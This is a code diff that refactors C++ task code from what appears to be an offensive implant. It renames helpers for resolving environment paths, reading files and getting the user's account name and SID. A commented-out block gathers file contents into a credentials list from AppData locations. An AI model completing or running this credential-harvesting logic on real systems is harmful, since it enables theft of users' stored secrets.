@@ -36,10 +36,10 @@
             std::map<std::wstring, std::vector<std::wstring>> result;
 
             // Get env paths.
-            std::wstring envAppData = System::Env::GetStrings(pState->pProcs, L"%APPDATA%");
-            std::wstring envLocalAppData = System::Env::GetStrings(pState->pProcs, L"%LOCALAPPDATA%");
-            std::wstring envSystemDrive = System::Env::GetStrings(pState->pProcs, L"%SYSTEMDRIVE%");
-            std::wstring envSystemRoot = System::Env::GetStrings(pState->pProcs, L"%SYSTEMROOT%");
+            std::wstring envAppData = System::Env::EnvStringsGet(pState->pProcs, L"%APPDATA%");
+            std::wstring envLocalAppData = System::Env::EnvStringsGet(pState->pProcs, L"%LOCALAPPDATA%");
+            std::wstring envSystemDrive = System::Env::EnvStringsGet(pState->pProcs, L"%SYSTEMDRIVE%");
+            std::wstring envSystemRoot = System::Env::EnvStringsGet(pState->pProcs, L"%SYSTEMROOT%");
 
             // Currently not working on this code.
 
@@ -79,7 +79,7 @@
             //         std::vector<std::wstring> wCreds = {};
             //         for (const std::wstring& wFile : files) {
 
-            //             std::vector<char> readBytes = System::Fs::ReadBytesFromFile(wFile);
+            //             std::vector<char> readBytes = System::Fs::FileRead(pProcs, wFile);
             //             if (readBytes.size() == 0)
             //             {
             //                 continue;
@@ -96,7 +96,7 @@
             //         std::vector<std::wstring> wCreds = {};
 
             //         // Get the file contents.
-            //         std::vector<char> readBytes = System::Fs::ReadBytesFromFile(wTarget);
+            //         std::vector<char> readBytes = System::Fs::FileRead(pProcs, wTarget);
             //         if (readBytes.size() == 0)
             //         {
             //             continue;
@@ -119,7 +119,7 @@ namespace Task
     {
         std::wstring result = L"";
 
-        std::wstring wAccountName = System::User::GetAccountName();
+        std::wstring wAccountName = System::User::UserAccountNameGet();
         if (wAccountName == L"")
         {
             return L"Error: Failed to get the current account name.";
@@ -127,7 +127,7 @@ namespace Task
         std::vector<std::wstring> wAccountNameSplit = Utils::Split::Split(wAccountName, L'\\');
         std::wstring wUserName = wAccountNameSplit[1];
 
-        std::wstring wUserSID = System::User::GetSID();
+        std::wstring wUserSID = System::User::UserSIDGet(pState->pProcs);
         if (wUserSID == L"")
         {
             return L"Error: Failed to get the current user SID.";
